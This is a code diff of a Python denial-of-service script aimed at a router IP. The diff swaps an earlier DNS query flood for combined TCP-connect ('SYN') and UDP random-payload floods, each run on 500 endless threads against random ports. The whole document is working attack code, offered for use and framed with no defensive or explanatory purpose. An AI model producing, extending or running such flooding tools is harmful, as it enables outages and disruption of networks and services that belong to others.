@@ -1,23 +1,37 @@
 import socket
 import threading
+import random
 
-router_ip = "192.168.1.1"  # CHANGE TO YOUR ROUTER IP
-router_port = 53
+router_ip = "192.168.1.1"  # ← YOUR ROUTER IP
 
-query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
-
-def flood():
+def syn_flood():
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(query, (router_ip, router_port))
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.1)
+            sock.connect_ex((router_ip, random.randint(1, 65535)))
             sock.close()
         except:
             pass
 
-# Start 500 threads
-for _ in range(500):
-    threading.Thread(target=flood, daemon=True).start()
+def udp_flood():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            data = random.randbytes(1450)  # Max UDP before fragmentation
+            sock.sendto(data, (router_ip, random.randint(1, 65535)))
+            sock.close()
+        except:
+            pass
 
+# Start 500 SYN threads
+for _ in range(500):
+    threading.Thread(target=syn_flood, daemon=True).start()
+
+# Start 500 UDP threads  
+for _ in range(500):
+    threading.Thread(target=udp_flood, daemon=True).start()
+
+print("SYN+UDP Combo flooding...")
 while True:
     pass
